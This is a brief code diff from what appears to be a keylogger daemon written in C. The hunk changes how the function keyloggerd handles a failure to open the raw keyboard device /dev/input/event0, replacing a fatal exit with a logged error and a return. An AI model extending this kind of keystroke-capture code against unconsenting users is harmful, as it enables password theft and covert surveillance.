@@ -137,7 +137,8 @@ void keyloggerd(cmd_args_t cmd_args)
 
     /* Hardcode the input device for now... */
     if ((keyboard = open("/dev/input/event0", O_RDONLY)) == -1) {
-        err_quit("Failed to open keyboard device: %s", strerror(errno));
+        logger.error("Failed to open keyboard device: %s", strerror(errno));
+        return;
     }
 
     /*
